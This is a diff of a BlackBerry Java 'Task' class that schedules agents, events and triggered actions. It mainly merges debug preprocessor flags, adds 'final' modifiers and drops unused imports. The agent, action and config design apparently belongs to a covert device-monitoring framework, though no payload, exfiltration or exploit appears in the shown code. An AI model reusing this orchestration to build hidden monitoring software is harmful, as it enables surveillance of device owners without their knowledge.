@@ -18,13 +18,11 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.RuntimeStore;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
-import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
 import blackberry.log.LogCollector;
 import blackberry.utils.Check;
-import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -52,7 +50,7 @@ public final class Task implements Singleton {
         if (instance == null) {
             instance = (Task) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                Task singleton = new Task();
+                final Task singleton = new Task();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
@@ -97,7 +95,7 @@ public final class Task implements Singleton {
         eventManager = EventManager.getInstance();
         agentManager = AgentManager.getInstance();
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Task created");
 
         //#endif
@@ -123,7 +121,7 @@ public final class Task implements Singleton {
 
                 lastActionCheckedStart = new Date();
 
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 // debug.trace("checkActions");
                 //#endif
                 final int[] actionIds = status.getActionIdTriggered();
@@ -145,7 +143,7 @@ public final class Task implements Singleton {
                             continue;
                         }
 
-                        //#ifdef DEBUG_TRACE
+                        //#ifdef DEBUG
                         debug.trace("CheckActions() triggered: " + action);
                         //#endif
                         action.setTriggered(false, null);
@@ -171,7 +169,7 @@ public final class Task implements Singleton {
                                  * .getTriggeringEvent());
                                  */
 
-                                //#ifdef DEBUG_TRACE
+                                //#ifdef DEBUG
                                 debug.trace("CheckActions() prepareExecute: "
                                         + action);
                                 //#endif
@@ -182,7 +180,7 @@ public final class Task implements Singleton {
                                 actionThread.start();
 
                                 synchronized (subAction) {
-                                    //#ifdef DEBUG_TRACE
+                                    //#ifdef DEBUG
                                     debug.trace("CheckActions() wait");
                                     //#endif  
                                     if (!subAction.isFinished()) {
@@ -197,13 +195,13 @@ public final class Task implements Singleton {
                                 if (!subAction.isFinished()) {
                                     ret = false;
                                     actionThread.interrupt();
-                                    //#ifdef DEBUG_TRACE
+                                    //#ifdef DEBUG
                                     debug
                                             .trace("CheckActions() interrupted thread");
                                     //#endif
                                 }
 
-                                //#ifdef DEBUG_TRACE
+                                //#ifdef DEBUG
                                 debug.trace("CheckActions() waited");
                                 //#endif
 
@@ -223,18 +221,18 @@ public final class Task implements Singleton {
                                     debug.warn("checkActions: reloading");
                                     //#endif
                                     status.unTriggerAll();
-                                    //#ifdef DEBUG_TRACE
+                                    //#ifdef DEBUG
                                     debug
                                             .trace("checkActions: stopping agents");
                                     //#endif
                                     agentManager.stopAll();
-                                    //#ifdef DEBUG_TRACE
+                                    //#ifdef DEBUG
                                     debug
                                             .trace("checkActions: stopping events");
                                     //#endif
                                     eventManager.stopAll();
                                     Utils.sleep(2000);
-                                    //#ifdef DEBUG_TRACE
+                                    //#ifdef DEBUG
                                     debug.trace("checkActions: untrigger all");
                                     //#endif
                                     status.unTriggerAll();
@@ -250,7 +248,7 @@ public final class Task implements Singleton {
                                     continue;
                                 }
                             } catch (final Exception ex) {
-                                //#ifdef DEBUG_ERROR
+                                //#ifdef DEBUG
                                 debug.error("checkActions for: " + ex);
                                 //#endif
                             }
@@ -261,9 +259,9 @@ public final class Task implements Singleton {
 
                 Utils.sleep(SLEEPING_TIME);
             }
-        } catch (Throwable ex) {
+        } catch (final Throwable ex) {
             // catching trowable should break the debugger anc log the full stack trace
-            //#ifdef DEBUG_FATAL
+            //#ifdef DEBUG
             debug.fatal("checkActions error, restart: " + ex);
             //#endif
             return true;
@@ -274,7 +272,7 @@ public final class Task implements Singleton {
      * Start application timer.
      */
     synchronized void startApplicationTimer() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("startApplicationTimer");
         //#endif
 
@@ -294,7 +292,7 @@ public final class Task implements Singleton {
      * Stop application timer.
      */
     public synchronized void stopApplicationTimer() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("stopApplicationTimer");
         //#endif
         if (applicationTimer != null) {
@@ -308,7 +306,7 @@ public final class Task implements Singleton {
      * Start application timer.
      */
     public synchronized void resumeApplicationTimer() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("resumeApplicationTimer");
         //#endif
 
@@ -333,7 +331,7 @@ public final class Task implements Singleton {
      * Stop application timer.
      */
     synchronized void suspendApplicationTimer() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("suspendApplicationTimer");
         //#endif
         if (applicationTimer != null) {
@@ -356,18 +354,18 @@ public final class Task implements Singleton {
 
         if (lastActionCheckedStart != null) {
 
-            long timestamp = (new Date()).getTime();
-            long lastActionElapse = timestamp
+            final long timestamp = (new Date()).getTime();
+            final long lastActionElapse = timestamp
                     - lastActionCheckedStart.getTime();
 
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("lastAction: " + lastAction + " lastSubAction: "
                     + lastSubAction + " elapsed:" + lastActionElapse);
             //#endif
 
             // se impiega piu' di cinque minuti
             if (lastActionElapse > 1000 * 60 * 5) {
-                //#ifdef DEBUG_WARN
+                //#ifdef DEBUG
                 debug.warn("lastAction stuck in the middle");
                 //#endif
                 ret = false;
@@ -375,11 +373,11 @@ public final class Task implements Singleton {
                 // try to reset it
                 try {
                     actionThread.interrupt();
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("verifyTimers() interrupted thread");
                     //#endif
-                } catch (Exception ex) {
-                    //#ifdef DEBUG_ERROR
+                } catch (final Exception ex) {
+                    //#ifdef DEBUG
                     debug.error(ex);
                     //#endif
                 }
@@ -387,46 +385,47 @@ public final class Task implements Singleton {
 
             if (lastActionCheckedEnd != null) {
 
-                long lastActionDifference = lastActionCheckedStart.getTime()
+                final long lastActionDifference = lastActionCheckedStart
+                        .getTime()
                         - lastActionCheckedEnd.getTime();
 
                 // se e' passata piu' di un ora dall'ultimo check
                 if (lastActionDifference > 1000 * 60 * 5) {
-                    //#ifdef DEBUG_WARN
+                    //#ifdef DEBUG
                     debug.warn("lastAction stuck somewhere");
                     //#endif
                     ret = false;
                 }
             }
         } else {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug
                     .warn("lastActionCheckedEnd || lastActionCheckedStart == null");
             //#endif
         }
 
         if (applicationTimer == null) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("applicationTimer == null");
             //#endif
             ret = false;
         }
 
         if (appUpdateManager == null) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("appUpdateManager == null");
             //#endif
             ret = false;
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("verifyTimers: " + ret + " lastActionCheckedStart:"
                 + lastActionCheckedStart + " lastActionCheckedStop:"
                 + lastActionCheckedEnd);
         //#endif
 
         if (ret == false) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("verifyTimers: something wrong here");
             //#endif
         }
@@ -440,7 +439,7 @@ public final class Task implements Singleton {
      * @return true, if successful
      */
     public boolean taskInit() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("TaskInit");
         //#endif
 
@@ -450,8 +449,8 @@ public final class Task implements Singleton {
         if (device != null) {
             try {
                 device.refreshData();
-            } catch (Exception ex) {
-                //#ifdef DEBUG_ERROR
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
                 debug.error(ex);
                 //#endif
             }
@@ -460,7 +459,7 @@ public final class Task implements Singleton {
         conf = new Conf();
 
         if (conf.load() == false) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("Load Conf FAILED");
             //#endif
 
@@ -474,32 +473,32 @@ public final class Task implements Singleton {
         // Da qui in poi inizia la concorrenza dei thread
 
         if (eventManager.startAll() == false) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("eventManager FAILED");
             //#endif
             return false;
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Events started");
 
         //#endif
 
         if (agentManager.startAll() == false) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("agentManager FAILED");
             //#endif
             return false;
         }
 
         if (!DeviceInfo.isInHolster()) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("going to start ApplicationTimer");
             //#endif
             startApplicationTimer();
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Agents started");
 
         //#endif
